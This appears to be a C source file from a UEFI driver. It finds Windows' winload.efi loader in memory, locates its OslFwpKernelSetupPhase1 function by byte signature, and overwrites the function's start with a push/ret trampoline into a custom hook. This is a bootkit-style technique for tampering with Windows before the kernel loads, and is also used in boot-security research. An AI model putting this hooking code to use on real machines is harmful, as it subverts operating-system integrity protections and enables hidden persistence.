/** @file
	Windows OS Loader
**/



// Libraries
#include <Uefi.h>                                   // https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
#include <Library/UefiBootServicesTableLib.h>       // https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
#include <Library/UefiLib.h>                        // https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
#include <Library/BaseMemoryLib.h>                  // https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h



// Local
#include <Functions/Utils/3FunctionsUtilsMemory.h>
#include <Functions/Utils/5FunctionsUtilsPattern.h>
#include <Functions/Utils/6FunctionsUtilsAddress.h>
#include <Functions/Utils/7FunctionsUtilsPortableExecutable.h>
#include <Functions/Utils/9FunctionsUtilsHooks.h>
#include <Functions/Utils/10FunctionsUtilsSignatures.h>
#include <Functions/Hooks/2FunctionsHooksWinloadEfi1OslFwpKernelSetupPhase1.h>



// Structures
#include <Structures/2pe.h>



/**
	Patch to Windows OS Loader (winload.efi) image.

  	This function applies a custom patch to modify the behavior of the Windows OS Loader.

	@param[in]		ImageBase			A pointer to the base address of the loaded image.
	@param[in]		NtHeaders			A pointer to the NT headers of the Winload EFI image.

	@retval			EFI_SUCCESS			The patch was successfully applied.
	@retval			other				An error occurs during the patching process.
**/

EFI_STATUS
EFIAPI
FunctionsWindowsOSLoader_PatchWinloadEfi(
	IN		VOID*						ImageBase,
	IN		PEFI_IMAGE_NT_HEADERS		NtHeaders
	)
{
    // Set console text output color
    //gST->ConOut->SetAttribute(gST->ConOut, EFI_BROWN | EFI_BACKGROUND_BLACK);


	// Variables
	EFI_STATUS Status;
	PEFI_IMAGE_SECTION_HEADER CodeSection = NULL, PatternSection = NULL;
	PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
	UINT16 MajorVersion = 0, MinorVersion = 0, BuildNumber = 0, Revision = 0;


	// Hello World
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Hello World\r\n");


	// Get version info
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Get version info\r\n");
	Status = FunctionsUtilsPortableExecutable_GetVersionPEFile(ImageBase, &MajorVersion, &MinorVersion, &BuildNumber, &Revision, NULL);

	// Failed
	if (EFI_ERROR(Status))
	{
		//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - FunctionsUtilsPortableExecutable_GetVersionPEFile failed: %llx (%r).\r\n", Status, Status);
		return EFI_NOT_FOUND;
	}


	// Print info
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Print info\r\n");
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Winload.efi v%u.%u.%u.%u...\r\n", MajorVersion, MinorVersion, BuildNumber, Revision);


	// Find .text and .rdata sections
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Find .text and .rdata sections\r\n");
	for (UINT16 i = 0; i < NtHeaders->FileHeader.NumberOfSections; ++i)
	{
		CHAR8 SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME + 1];
		CopyMem(SectionName, Section->Name, EFI_IMAGE_SIZEOF_SHORT_NAME);
		SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME] = '\0';

		if (AsciiStrCmp(SectionName, ".text") == 0)
		{
			CodeSection = Section;
		}
		else if (AsciiStrCmp(SectionName, ".rdata") == 0)
		{
			PatternSection = Section;
		}

		Section++;
	}


	// Find OslFwpKernelSetupPhase1 signature
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Find OslFwpKernelSetupPhase1 signature\r\n");
	UINT8* Found = NULL;
	Status = FunctionsUtilsPattern_FindPattern(SigOslFwpKernelSetupPhase1, 0xCC, sizeof(SigOslFwpKernelSetupPhase1), (VOID*)((UINT8*)ImageBase + CodeSection->VirtualAddress),  CodeSection->SizeOfRawData, (VOID**)&Found);

	// Failed
	if (EFI_ERROR(Status))
    {
		//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - FunctionsUtilsPattern_FindPattern failed: Failed to find winload!OslFwpKernelSetupPhase1 signature, %llx (%r).\r\n", Status, Status);
        return Status;
    }


	// Find OslFwpKernelSetupPhase1 start
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Find OslFwpKernelSetupPhase1 start\r\n");
	gOriginalWinloadOslFwpKernelSetupPhase1 = FunctionsUtilsAddress_FindStartAddress(ImageBase, NtHeaders, Found);

	// Failed
	if (gOriginalWinloadOslFwpKernelSetupPhase1 == NULL)
	{
		//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - FunctionsUtilsAddress_FindStartAddress failed: Failed to find winload!OslFwpKernelSetupPhase1 start\r\n");
		return EFI_NOT_FOUND;
	}


	// Hook winload.efi!OslFwpKernelSetupPhase1
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Hook winload.efi!OslFwpKernelSetupPhase1\r\n");
	VOID* HookAddress = (VOID*)&FunctionsHooksWinloadEfi_OslFwpKernelSetupPhase1;
	//gST->ConOut->SetAttribute(gST->ConOut, EFI_BROWN | EFI_BACKGROUND_BLACK);


	// Raise TPL
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Raise TPL\r\n");
	CONST EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL); // https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-raisetpl


	// Copy OslFwpKernelSetupPhase1 bytes
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Copy OslFwpKernelSetupPhase1 bytes\r\n");
	CopyMem(gBytesWinloadEfiOslFwpKernelSetupPhase1Backup, (VOID*)gOriginalWinloadOslFwpKernelSetupPhase1, sizeof(gFauxCallHookTemplate)); // https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-copymem


	// Place faux call (push addr, ret) at the start of the original function to transfer the execution to the hooked function
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Place faux call at the start of the original function\r\n");

	// Place hook template in original address
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Place hook template in original address\r\n");
	FunctionsUtilsMemory_CopyMemory((VOID*)gOriginalWinloadOslFwpKernelSetupPhase1, gFauxCallHookTemplate, sizeof(gFauxCallHookTemplate));

	// Place HookAddress in template
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Place HookAddress in template\r\n");
	FunctionsUtilsMemory_CopyMemory((UINT8*)gOriginalWinloadOslFwpKernelSetupPhase1 + gFauxCallHookTemplateAddressOffset, (UINTN*)&HookAddress, sizeof(HookAddress));


	// Restore TPL
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Restore TPL\r\n");
	gBS->RestoreTPL(Tpl); // https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-restoretpl


    // Bye
	//Print(L"DriverDXERuntime [Functions/WindowsOSLoader.c] (PatchWinloadEfi) - Bye\r\n");
    return EFI_SUCCESS;
}
